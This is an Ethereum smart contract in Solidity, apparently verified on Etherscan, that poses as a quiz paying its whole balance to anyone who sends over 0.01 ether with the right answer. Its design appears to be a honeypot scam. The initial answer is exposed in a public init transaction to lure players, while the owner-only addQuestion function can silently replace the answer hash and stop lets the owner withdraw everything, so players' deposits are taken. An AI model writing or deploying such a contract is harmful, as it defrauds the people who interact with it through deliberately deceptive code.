/**
 *Submitted for verification at Etherscan.io on 2022-04-20
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract GuessMyAnswerFromEtherscan {
  string public q;
  address private sender;
  bytes32 private secretHash;

  constructor() public payable {}

  function answer(string memory _response) external payable {
    if (secretHash == keccak256(abi.encode(_response)) && msg.value > 0.01 ether) {
      msg.sender.transfer(address(this).balance);
    }
    require(msg.sender == tx.origin);
  }

  function init(string calldata _q, string calldata _response) public payable {
    if (secretHash == 0x0) // Not initialized yet
    {
      secretHash = keccak256(abi.encode(_response));
      q = _q;
      sender = msg.sender;
    }
  }

  function stop() public payable {
    require(msg.sender == sender);
    msg.sender.transfer(address(this).balance);
  }

  function addQuestion(string calldata _q, bytes32 _secretHash) public payable {
    require(msg.sender == sender);
    q = _q;
    secretHash = _secretHash;
  }
}